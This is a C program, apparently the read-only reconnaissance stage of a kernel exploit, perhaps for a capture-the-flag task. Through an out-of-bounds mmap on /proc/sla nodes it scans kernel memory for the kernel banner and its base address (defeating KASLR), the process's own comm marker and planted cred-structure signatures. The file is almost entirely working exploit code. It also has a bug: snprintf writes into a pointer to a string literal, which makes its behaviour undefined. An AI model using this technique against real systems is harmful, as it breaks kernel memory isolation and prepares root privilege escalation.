/* slaenum.c — 把 /proc/sla(以及几个候选节点)逐个 mmap 一遍:
 *   每个节点的 private_data 是**另一次 kmalloc** ⇒ 每次给一段不同的物理窗口。
 *   对每一段问两句: (a) 里面有没有 "Linux version " (镜像在不在),
 *                    (b) 里面有没有我们自己的 comm 标记 / cred id 签名(能不能认出自己)。
 * 全程只读, 零 punch。 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <dirent.h>
#include <unistd.h>
#include <setjmp.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/prctl.h>

static sigjmp_buf jb;
static volatile int on;
static void sbb(int s) { (void)s; if (on) siglongjmp(jb, 1); }
static uint64_t q(const unsigned char *p, size_t o) { uint64_t v; memcpy(&v, p + o, 8); return v; }
static int cmp64(const void *a, const void *b) {
  uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
  return x < y ? -1 : (x > y ? 1 : 0);
}
static uint64_t find_base(const unsigned char *m, const unsigned char *ok, size_t np, size_t *cnt_out) {
  size_t cap = 2u << 20, n = 0;
  uint64_t *kv = malloc(cap * sizeof *kv);
  if (!kv) return 0;
  for (size_t i = 0; i < np; i++) {
    if (!ok[i]) continue;
    for (size_t o = i * 4096u; o + 8 <= (i + 1) * 4096u; o += 8) {
      uint64_t v = q(m, o);
      if ((v >> 48) != 0xffffULL || v <= o) continue;
      if (n < cap) kv[n++] = (v - o) & ~0xfffULL;
    }
  }
  qsort(kv, n, sizeof *kv, cmp64);
  uint64_t best = 0; size_t bestn = 0, run = 1;
  for (size_t i = 1; i <= n; i++) {
    if (i < n && kv[i] == kv[i - 1]) run++;
    else { if (run > bestn) { bestn = run; best = kv[i - 1]; } run = 1; }
  }
  free(kv);
  if (cnt_out) *cnt_out = bestn;
  return best;
}

static const uint64_t SIG = 0x07d007d007d007d0ULL;

static void probe(const char *path, const char *nm) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) { printf("[%s] open 失败 errno=%d(%s)\n", path, errno, strerror(errno)); return; }
  size_t L = 0;
  unsigned char *m = MAP_FAILED;
  for (size_t s = (1ull << 30); s >= (16u << 20); s >>= 1) {
    m = mmap(NULL, s, PROT_READ, MAP_SHARED, fd, 0);
    if (m != MAP_FAILED) { L = s; break; }
  }
  if (m == MAP_FAILED) {
    printf("[%s] mmap 失败 errno=%d(%s) —— 这个节点没有可用的过界读\n", path, errno, strerror(errno));
    close(fd); return;
  }
  struct sigaction sa, old;
  memset(&sa, 0, sizeof sa); sa.sa_handler = sbb; sigemptyset(&sa.sa_mask);
  sigaction(SIGBUS, &sa, &old);
  size_t np = L / 4096u, okp = 0, first_bad = 0, last_ok = 0;
  unsigned char *ok = calloc(np, 1);
  for (size_t i = 0; i < np; i++) {
    on = 1;
    if (sigsetjmp(jb, 1) == 0) { volatile char c = m[i * 4096u]; (void)c; ok[i] = 1; okp++; last_ok = i; }
    else if (!first_bad) first_bad = i;
    on = 0;
  }
  size_t bcnt = 0;
  uint64_t K = find_base(m, ok, np, &bcnt);
  /* (a) 镜像在不在 */
  const char *pat = "Linux version ";
  size_t pl = strlen(pat), ban = 0;
  int has_ban = 0;
  for (size_t i = 0; i < np && !has_ban; i++) {
    if (!ok[i]) continue;
    for (size_t o = i * 4096u; o + pl + 4 <= (i + 1) * 4096u && o + pl + 4 <= L; o++)
      if (m[o] == 'L' && !memcmp(m + o, pat, pl)) { ban = o; has_ban = 1; break; }
  }
  /* (b) cred id 签名(按 4 步进!) */
  size_t ncred = 0, cr0 = 0;
  for (size_t i = 0; i < np; i++) {
    if (!ok[i]) continue;
    for (size_t o = i * 4096u; o + 36 <= (i + 1) * 4096u && o + 36 <= L; o += 4) {
      if (q(m, o) != SIG || q(m, o + 8) != SIG || q(m, o + 16) != SIG || q(m, o + 24) != SIG) continue;
      if (!ncred) cr0 = o;
      ncred++;
      o += 28;
    }
  }
  /* (c) 我们的 comm 标记 */
  size_t ml = strlen(nm), cm = 0;
  int has_cm = 0;
  for (size_t o = 0; o + ml + 1 <= L && !has_cm; o++) {
    size_t pg = o / 4096u;
    if (!ok[pg]) { o = (pg + 1) * 4096u - 1; continue; }
    if (m[o] == nm[0] && !memcmp(m + o, nm, ml)) { cm = o; has_cm = 1; }
  }
  printf("[%s] len=%zuMB 可读=%zuMB(首个洞 +%zuMB, 最后可读 +%zuMB) K=%016llx(自洽 %zu)\n",
         path, L >> 20, okp, (first_bad * 4096u) >> 20, (last_ok * 4096u) >> 20,
         (unsigned long long)K, bcnt);
  printf("        banner=%s  cred签名=%zu 处  comm标记=%s\n",
         has_ban ? "在(镜像可读!)" : "不在", ncred, has_cm ? "在" : "不在");
  if (has_ban) {
    char txt[65];
    memcpy(txt, m + ban, 64); txt[64] = 0;
    for (int c = 0; c < 64; c++) if ((unsigned char)txt[c] < 0x20 || (unsigned char)txt[c] > 0x7e) txt[c] = '.';
    printf("        banner @ +%zu : %s\n", ban, txt);
  }
  if (ncred) printf("        第一个 cred 签名 @ +%zu (K+off=%016llx) usage/uid=%016llx\n",
                    cr0, (unsigned long long)(K + cr0), (unsigned long long)q(m, cr0 - 4));
  if (has_cm) printf("        comm 标记 @ +%zu (K+off=%016llx)\n", cm, (unsigned long long)(K + cm));
  free(ok);
  munmap(m, L);
  close(fd);
}

int main(int argc, char **argv) {
  const char *nm = argc > 1 ? argv[1] : "SLA9x7Qm2Wt4Zk";
  char buf[256];
  snprintf(nm, 16, "%s", nm);
  prctl(PR_SET_NAME, nm, 0, 0, 0);
  DIR *d = opendir("/proc/sla");
  if (!d) { printf("opendir /proc/sla 失败 errno=%d\n", errno); return 1; }
  struct dirent *e;
  while ((e = readdir(d))) {
    if (e->d_name[0] == '.') continue;
    snprintf(buf, sizeof buf, "/proc/sla/%s", e->d_name);
    printf("--------------------------------------------------\n");
    probe(buf, nm);
    fflush(stdout);
  }
  closedir(d);
  return 0;
}
